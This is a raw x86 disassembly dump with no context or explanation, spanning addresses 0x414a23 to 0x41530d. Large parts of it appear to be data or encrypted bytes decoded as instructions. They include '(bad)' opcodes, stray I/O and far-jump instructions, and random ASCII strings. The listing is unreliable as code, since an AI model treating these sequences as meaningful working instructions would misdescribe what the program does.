  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   QWORD PTR [ebx+0x46]
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [ecx+edx*1],dh
  414bc0:	inc    ebx
  414bc1:	add    BYTE PTR [ecx+0x49],bl
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	pop    eax
  414c0f:	and    DWORD PTR [ebx+0x0],eax
  414c12:	add    BYTE PTR [eax],al
  414c14:	add    BYTE PTR [eax],al
  414c16:	dec    ecx
  414c17:	add    BYTE PTR [eax+eax*1+0x69],al
  414c1b:	add    BYTE PTR [eax+eax*1+0x4b],ah
  414c1f:	add    BYTE PTR [edx+0x0],cl
  414c22:	dec    ebx
  414c23:	add    BYTE PTR [edx+0x0],cl
  414c26:	inc    esp
  414c27:	add    BYTE PTR [ebx+0x0],ch
  414c2a:	ins    BYTE PTR es:[edi],dx
  414c2b:	add    BYTE PTR [edx+0x0],ch
  414c2e:	inc    esp
  414c2f:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c33:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c37:	add    BYTE PTR [ecx+0x0],cl
  414c3a:	push   ebp
  414c3b:	add    BYTE PTR [edx+0x0],cl
  414c3e:	dec    ebx
  414c3f:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c43:	add    BYTE PTR [edx+0x0],cl
  414c46:	dec    ebx
  414c47:	add    BYTE PTR [eax+0x0],cl
  414c4a:	inc    esp
  414c4b:	add    BYTE PTR [edx+0x0],cl
	...
  414c56:	imul   ebp,DWORD PTR fs:[edx+0x73],0x6b
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fst    DWORD PTR [edi]
  414e41:	repnz mov al,ds:0xe58c24
  414e47:	add    ch,dh
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    BYTE PTR [ebp+0x5e],bl
  414e4e:	and    DWORD PTR [ebp+0x1012208b],edx
  414e54:	(bad)  
  414e55:	push   cs
  414e56:	popf   
  414e57:	mov    bh,0x16
  414e59:	jecxz  0x414e38
  414e5b:	push   edx
  414e5c:	push   es
  414e5d:	and    dh,BYTE PTR [eax]
  414e5f:	dec    esp
  414e60:	mov    ?,WORD PTR [edx+0x60]
  414e63:	and    eax,0x8249cd98
  414e68:	es jo  0x414e77
  414e6b:	dec    ebp
  414e6c:	push   ebx
  414e6d:	jo     0x414e2e
  414e6f:	arpl   ax,ax
  414e71:	fmul   QWORD PTR [ebp-0x1f]
  414e74:	aaa    
  414e75:	sub    al,0x3
  414e77:	sbb    eax,0x57153ec8
  414e7c:	(bad)  
  414e7d:	pop    edi
  414e7e:	aas    
  414e7f:	mov    ds:0x569c3a57,eax
  414e84:	adc    edx,DWORD PTR [edx+0x8]
  414e87:	mov    al,0xb0
  414e89:	mov    ebx,0x7665da52
  414e8e:	pop    edi
  414e8f:	les    ebx,FWORD PTR [ecx+eiz*2]
  414e92:	pop    edi
  414e93:	mov    edx,0x5d43eda3
  414e98:	pop    ss
  414e99:	sbb    eax,0x2776b22
  414e9e:	mov    eax,0xd71f4626
  414ea3:	xor    ebx,DWORD PTR [ecx-0x7282a40]
  414ea9:	in     eax,0xad
  414eab:	cli    
  414eac:	in     al,0x1e
  414eae:	xor    BYTE PTR [edx-0x7e63aa54],0x4a
  414eb5:	rcr    DWORD PTR [ebx],1
  414eb7:	sub    dh,BYTE PTR [edi]
  414eb9:	aaa    
  414eba:	inc    eax
  414ebb:	rol    eax,0x2c
  414ebe:	nop
  414ebf:	das    
  414ec0:	cdq    
  414ec1:	in     al,dx
  414ec2:	enter  0x2397,0x80
  414ec6:	mov    es,edi
  414ec8:	and    eax,0xd4e8ed9c
  414ecd:	jbe    0x414e87
  414ecf:	push   ebp
  414ed0:	fild   DWORD PTR [esi+0x2d2e9d4e]
  414ed6:	enter  0x8610,0x30
  414eda:	ja     0x414eb6
  414edc:	pop    es
  414edd:	mov    di,sp
  414ee0:	or     al,0xa4
  414ee2:	inc    ebp
  414ee3:	sub    BYTE PTR [esp+eiz*8+0x59efe542],ch
  414eea:	add    esi,eax
  414eec:	popf   
  414eed:	push   ebx
  414eee:	xor    al,0xd3
  414ef0:	fidivr WORD PTR [ecx]
  414ef2:	dec    esp
  414ef3:	pop    ecx
  414ef4:	xchg   ecx,eax
  414ef5:	inc    edx
  414ef6:	mov    DWORD PTR [ecx+0x85bda7c],esi
  414efc:	cmp    al,0x48
  414efe:	daa    
  414eff:	fucomip st,st(7)
  414f01:	mov    bl,0x2e
  414f03:	rcr    BYTE PTR ds:0x83e2f17,cl
  414f09:	repnz or al,0x2
  414f0c:	pop    es
  414f0d:	rol    DWORD PTR [ecx],cl
  414f0f:	outs   dx,BYTE PTR ds:[esi]
  414f10:	mov    eax,0x9ce92366
  414f15:	mov    cl,0x4c
  414f17:	and    ecx,ebx
  414f19:	bound  ecx,QWORD PTR [ebx+0x86af74c]
  414f1f:	adc    eax,0xa8d75deb
  414f24:	add    DWORD PTR [ebp-0x4d],0x2f3e92e8
  414f2b:	mov    ebx,0x9c4029f4
  414f30:	pop    edx
  414f31:	or     BYTE PTR [ecx+0x32],0x45
  414f35:	inc    bp
  414f37:	mov    al,ds:0x3cc7b5fe
  414f3c:	repz jmp 0x414edb
  414f3f:	push   ss
  414f40:	fild   WORD PTR [eax]
	...
  414fb2:	add    BYTE PTR [eax],al
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0xc587
  414fc2:	cdq    
  414fc3:	cld    
  414fc4:	and    esi,0xf50000
  414fca:	add    BYTE PTR [eax],al
  414fcc:	pop    esi
  414fcd:	inc    ecx
  414fce:	mov    ss,WORD PTR [ebx+0x4e]
  414fd1:	mov    ds:0x90d59a5e,al
  414fd6:	loop   0x415021
  414fd8:	adc    BYTE PTR [ebp+edx*8+0x48],dh
  414fdc:	fisub  WORD PTR [ebp+eiz*2-0x566b6095]
  414fe3:	cld    
  414fe4:	push   0x42c0fa4e
  414fe9:	cli    
  414fea:	in     al,dx
  414feb:	mov    dh,0xd1
  414fed:	pop    edx
  414fee:	mov    esp,0xb3eac73a
  414ff3:	add    BYTE PTR [edx],ch
  414ff5:	(bad)  
  414ff6:	or     BYTE PTR [edi],al
  414ff8:	xchg   ecx,eax
  414ff9:	pop    edi
  414ffa:	xor    BYTE PTR [ecx],0xeb
  414ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ffe:	sar    ebx,cl
  415000:	pop    ebx
  415001:	jae    0x415003
  415003:	adc    eax,0xf2059ff6
  415008:	cmp    DWORD PTR [edi-0x3c],ecx
  41500b:	sub    DWORD PTR [esi],0xa52d92ab
  415011:	shr    ch,0x12
  415014:	jl     0x415044
  415016:	pop    ebp
  415017:	stos   BYTE PTR es:[edi],al
  415018:	jns    0x415039
  41501a:	icebp  
  41501b:	push   ebp
  41501c:	and    al,0x5b
  41501e:	mov    dl,0x80
  415020:	repnz shl DWORD PTR [esi-0x37b62650],1
  415027:	lock in eax,dx
  415029:	pop    ecx
  41502a:	or     cl,BYTE PTR [ebx+0x2896c109]
  415030:	jns    0x414fc4
  415032:	mov    ecx,0x5c8e7fe
  415037:	mov    bl,0x38
  415039:	mov    al,BYTE PTR [ebx-0x50fc1354]
  41503f:	(bad)  
  415041:	inc    ebx
  415042:	loope  0x415020
  415044:	mov    ch,BYTE PTR [esi+ebx*1+0x15]
  415048:	cmp    DWORD PTR [edi+0x341d9591],0x1c
  41504f:	dec    esp
  415050:	popa   
  415051:	mov    ecx,esi
  415053:	or     DWORD PTR [edx-0x4bd6d261],eax
  415059:	jl     0x4150a0
  41505b:	pop    ecx
  41505c:	rcr    DWORD PTR [ebx-0x24],0xdd
  415060:	xchg   ebx,eax
  415061:	add    bl,BYTE PTR [ecx-0x4b684953]
  415067:	mov    ch,0xeb
  415069:	out    dx,eax
  41506a:	mov    ds:0xc3e7ea55,al
  41506f:	xor    eax,0x5db84259
  415074:	jno    0x415012
  415076:	sub    al,0xe8
  415078:	aad    0xf7
  41507a:	and    DWORD PTR [eax],ecx
  41507c:	(bad)  
  41507d:	sti    
  41507e:	out    dx,eax
  41507f:	mov    al,ds:0x5125f5f2
  415084:	ds stos BYTE PTR es:[edi],al
  415086:	sbb    eax,0x31bfbb94
  41508b:	test   BYTE PTR [esi-0x3c224339],0xef
  415092:	std    
  415093:	data16 (bad) 
  415095:	adc    al,0x38
  415097:	(bad)  
  415098:	or     ah,BYTE PTR ds:0x7de44d6b
  41509e:	mov    cl,0xb5
  4150a0:	pop    eax
  4150a1:	retf   
  4150a2:	or     al,0x11
  4150a4:	jle    0x415112
  4150a6:	mov    ds:0xbfabd1b3,al
  4150ab:	and    eax,0x5942ef70
  4150b0:	adc    esi,edi
  4150b2:	lds    ecx,FWORD PTR [eax+ebx*1+0x32]
  4150b6:	and    dh,BYTE PTR [ebp+0x42]
  4150b9:	push   eax
  4150ba:	or     edx,DWORD PTR [ebp+0x4d]
  4150bd:	cmp    al,ch
  4150bf:	aad    0x36
	...
  415131:	add    BYTE PTR [eax],al
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi+0x3800c4d9]
  415142:	sbb    DWORD PTR [ebx],edi
  415144:	jbe    0x41512d
  415146:	add    BYTE PTR [eax],al
  415148:	cmc    
  415149:	add    BYTE PTR [eax],al
  41514b:	add    bh,cl
  41514d:	or     al,0xf9
  41514f:	fiadd  DWORD PTR [ecx-0x38e6b66]
  415155:	fwait
  415156:	stos   DWORD PTR es:[edi],eax
  415157:	jnp    0x415185
  415159:	or     BYTE PTR [edi],cl
  41515b:	sahf   
  41515c:	add    ebp,DWORD PTR [edi]
  41515e:	or     dl,BYTE PTR [ebx+0x30df81a1]
  415164:	or     eax,0x8d8ad5c
  415169:	sub    al,0x96
  41516b:	(bad)  
  41516c:	dec    ecx
  41516d:	mov    bh,0x23
  41516f:	or     bl,ch
  415171:	dec    ebp
  415172:	adc    eax,0xedd8f26b
  415177:	ret    
  415178:	push   esi
  415179:	sbb    DWORD PTR [edi+0x3cc1e7e],esi
  41517f:	push   edi
  415180:	std    
  415181:	push   eax
  415182:	dec    edi
  415183:	pop    ecx
  415184:	iret   
  415185:	test   eax,0x543b8c3
  41518a:	add    edx,DWORD PTR [edx]
  41518c:	xor    edx,DWORD PTR [ebp-0x79]
  41518f:	and    al,0x26
  415191:	mov    es,WORD PTR [esi+0x1aa53248]
  415197:	out    0x3d,eax
  415199:	xor    BYTE PTR [eax-0x5e969f81],bl
  41519f:	int    0x48
  4151a1:	aad    0x6b
  4151a3:	cli    
  4151a4:	jnp    0x415145
  4151a6:	cwde   
  4151a7:	push   edx
  4151a8:	jne    0x41521f
  4151aa:	hlt    
  4151ab:	and    al,0xb4
  4151ad:	jle    0x4151cd
  4151af:	arpl   WORD PTR [esi-0x39],bx
  4151b2:	addr16 push cs
  4151b4:	sub    BYTE PTR [edi+0x591e7e6f],bl
  4151ba:	push   ebx
  4151bb:	sub    BYTE PTR [ebx+0x15],cl
  4151be:	jns    0x4151a7
  4151c0:	inc    ebp
  4151c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c2:	shl    esp,0x2e
  4151c5:	and    esi,DWORD PTR [edi+0x3fed2a68]
  4151cb:	sbb    cl,bh
  4151cd:	push   esp
  4151ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151cf:	outs   dx,BYTE PTR ds:[esi]
  4151d0:	cmp    DWORD PTR [ebp-0x52],ebx
  4151d3:	std    
  4151d4:	int3   
  4151d5:	(bad)
  4151d9:	scas   al,BYTE PTR es:[edi]
  4151da:	inc    esp
  4151db:	jns    0x415249
  4151dd:	cmp    dl,dl
  4151df:	scas   al,BYTE PTR es:[edi]
  4151e0:	mov    ss,WORD PTR ds:[esi+0x20]
  4151e4:	sti    
  4151e5:	xchg   edi,eax
  4151e6:	jmp    0x3cdd2fc7
  4151eb:	enter  0xd13f,0xcb
  4151ef:	xchg   ebp,eax
  4151f0:	sub    eax,0x50fa9b03
  4151f5:	jg     0x4151d1
  4151f7:	pop    ds
  4151f8:	jmp    FWORD PTR [ebx+0x276fa72c]
  4151fe:	in     eax,0x49
  415200:	cmp    DWORD PTR [esi+0xec7c8ea],edi
  415206:	mov    dh,0xd7
  415208:	jnp    0x41527d
  41520a:	xchg   DWORD PTR [eax],ecx
  41520c:	int3   
  41520d:	cld    
  41520e:	aad    0xd3
  415210:	dec    ecx
  415211:	sub    DWORD PTR [esi],0xffffff82
  415214:	mov    al,0x25
  415216:	mov    es,WORD PTR [eax]
  415218:	aam    0x35
  41521a:	mov    ds,esi
  41521c:	mov    al,0xaf
  41521e:	clc    
  41521f:	xor    bl,BYTE PTR [esi]
  415221:	pop    edx
  415222:	in     eax,0x22
  415224:	retf   
  415225:	stos   DWORD PTR es:[edi],eax
  415226:	jne    0x415285
  415228:	inc    edi
  415229:	shl    esp,0x10
  41522c:	push   ds
  41522d:	fld    QWORD PTR [edi+esi*8+0x24]
  415231:	loopne 0x415275
  415233:	mov    cl,0x67
  415235:	out    dx,eax
  415236:	sbb    eax,eax
  415238:	mov    cl,0x0
  41523a:	lock mov eax,ds:0xba9760a9
  415240:	inc    ebx
	...
  4152b1:	add    BYTE PTR [eax],al
  4152b3:	add    BYTE PTR [ecx],al
  4152b5:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	outs   dx,DWORD PTR ds:[esi]
  4152c1:	sub    BYTE PTR [ebx+0xe86b62],ch
  4152c7:	add    ch,dh
  4152c9:	add    BYTE PTR [eax],al
  4152cb:	add    BYTE PTR [esi-0x72],dl
  4152ce:	mov    BYTE PTR [edi+esi*8+0x49651d36],ch
  4152d5:	jnp    0x4152c3
  4152d7:	add    eax,0x39f1233b
  4152dc:	mov    ?,WORD PTR [ebx]
  4152de:	retf   
  4152df:	sub    cl,dl
  4152e1:	cmp    DWORD PTR [edi+0x4a],esi
  4152e4:	sbb    bh,bh
  4152e6:	jge    0x415277
  4152e8:	cld    
  4152e9:	xor    eax,ebx
  4152eb:	push   cs
  4152ec:	or     esp,0xffffffe8
  4152ef:	pop    ds
  4152f0:	sti    
  4152f1:	pop    eax
  4152f2:	xor    al,0x2f
  4152f4:	test   DWORD PTR [ecx-0x6e2e211f],esp
  4152fa:	add    al,0x5f
  4152fc:	sbb    dl,cl
  4152fe:	mov    ebp,0xb7702f01
  415303:	xchg   edx,eax
  415304:	add    ebx,DWORD PTR [edi+0x7e7b7e89]
  41530a:	(bad)  
  41530b:	mov    bl,0xc1
  41530d:	or     edi,DWORD PTR [esi-0x732c1ae0]
